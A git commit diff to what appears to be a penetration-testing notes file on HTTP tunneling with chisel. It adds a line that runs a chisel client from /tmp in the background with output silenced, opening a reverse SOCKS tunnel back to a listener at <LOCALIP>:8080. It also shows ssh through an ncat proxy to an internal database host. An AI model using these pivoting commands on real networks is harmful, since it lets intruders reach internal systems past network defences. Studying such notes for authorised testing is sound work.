4fafd8c187349daac7a508adf47f76a93c8c4cfc
German Sanmillan <sanmillan.german@gmail.com>
2023-07-08 13:59:35 +0200

    fix

--- SubNets/Tunneling/HTTPTunneling/Chisel.sh
+++ SubNets/Tunneling/HTTPTunneling/Chisel.sh
@@ -1,3 +1,4 @@
+/tmp/chisel client <LOCALIP>:8080 R:socks > /dev/null 2>&1 & #<--- Redirects requests provening from the <LOCALIP>:8080 and forward it.
 chisel server --port 8080 --reverse #<--- Opens a SocksProxy that listen internal requests on port 8080.
 
 #To use this connection is necesary to use a tool which interact with an HTTPSocksProxy. For example; 'ncat'; 'ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215'
